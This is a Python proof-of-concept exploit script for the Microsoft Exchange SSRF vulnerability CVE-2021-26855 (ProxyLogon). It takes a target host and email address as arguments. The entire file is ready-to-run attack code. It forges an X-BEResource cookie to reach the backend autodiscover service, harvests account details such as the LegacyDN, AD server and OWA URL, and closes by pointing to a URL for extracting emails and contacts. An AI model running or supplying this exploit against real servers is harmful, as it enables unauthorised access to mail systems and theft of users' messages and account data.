# PoC Exploit Exchange Server SSRF Authenticated Backend Service (CVE-2021-26855)
# By Alex Hernandez aka alt3kx (c) Mar 2021")
#  
# Reference: https://www.praetorian.com/blog/reproducing-proxylogon-exploit/")
# Usage: python ssrf_auto.py <target> <email>")
# Example: python ssrf_auto.py mail.exchange.com administrator@exchange.com")
# 
# 
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import sys
import os

#proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if len(sys.argv) < 2:
  os.system('clear')
  print("PoC Exploit Exchange Server SSRF Authenticated Backend Service (CVE-2021-26855)")
  print("By Alex Hernandez aka alt3kx (c) Mar 2021")
  print("Reference: https://www.praetorian.com/blog/reproducing-proxylogon-exploit/\n")
  print("Usage: python ssrf_auto.py <target> <email>")
  print("Example: python ssrf_auto.py mail.exchange.com administrator@exchange.com")
  exit()

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
target = sys.argv[1]
email = sys.argv[2]

random_name = id_generator(3) + ".js"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % email

print("[+] \033[1mAttacking Exchange Server:\033[00m " + target)

FQDN = "EXCHANGE"
ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                        "User-Agent": user_agent},
                  verify=False, #proxies=proxies
                  )
if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
    FQDN = ct.headers["X-FEServer"]

ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
    "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
    "Content-Type": "text/xml",
    "User-Agent": user_agent},
                   data=autoDiscoverBody,
                   verify=False, 
                   #proxies=proxies
                   )
if ct.status_code != 200:
    print("[-] Autodiscover Error!")
    exit()
if "<LegacyDN>" not in ct.content:
    print("[-] Can not get LegacyDN! from " + email)
    exit()

legacyDn = ct.content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
DisplayName = ct.content.split("<DisplayName>")[1].split("</DisplayName>")[0]
Address = ct.content.split("<AutoDiscoverSMTPAddress>")[1].split("</AutoDiscoverSMTPAddress>")[0]
AccountType = ct.content.split("<AccountType>")[1].split("</AccountType>")[0]
MicrosoftOnline = ct.content.split("<MicrosoftOnline>")[1].split("</MicrosoftOnline>")[0]
PublicFolderServer = ct.content.split("<PublicFolderServer>")[1].split("</PublicFolderServer>")[0]
Server = ct.content.split("<Server>")[1].split("</Server>")[0]
AD = ct.content.split("<AD>")[1].split("</AD>")[0]
ServerExclusiveConnect = ct.content.split("<ServerExclusiveConnect>")[1].split("</ServerExclusiveConnect>")[0]
AuthPackage = ct.content.split("<AuthPackage>")[1].split("</AuthPackage>")[0]
CertPrincipalName = ct.content.split("<CertPrincipalName>")[1].split("</CertPrincipalName>")[0]
OWAUrl = ct.content.split("<OWAUrl AuthenticationMethod=")[1].split("</OWAUrl>")[0]
OOFUrl = ct.content.split("<OOFUrl>")[1].split("</OOFUrl>")[0]

print("[+] \033[32mSuccess!\033[00m: SSRF Authenticated on Backend Service")
print("[+] Got details...")
print("[+] Name: " + DisplayName)
print("[+] DN: " + legacyDn)
print("[+] SMTP Address: " + Address)
print("[+] Account Type: " + AccountType)
print("[+] Microsoft Online status: " + MicrosoftOnline) 
print("[+] Public folder Server: " + PublicFolderServer)
print("[+] Server: " + Server)
print("[+] AD: " + AD)
print("[+] Server Exclusive Connect status: " + ServerExclusiveConnect)
print("[+] Authentication Package used: " + AuthPackage)
print("[+] Cert Principal Name status: " + CertPrincipalName)
print("[+] OWA URL: " + OWAUrl)
print("[+] OOF Url: " + OOFUrl + "\t<- Use this URL to extract emails, contacts from BackEnd Service")

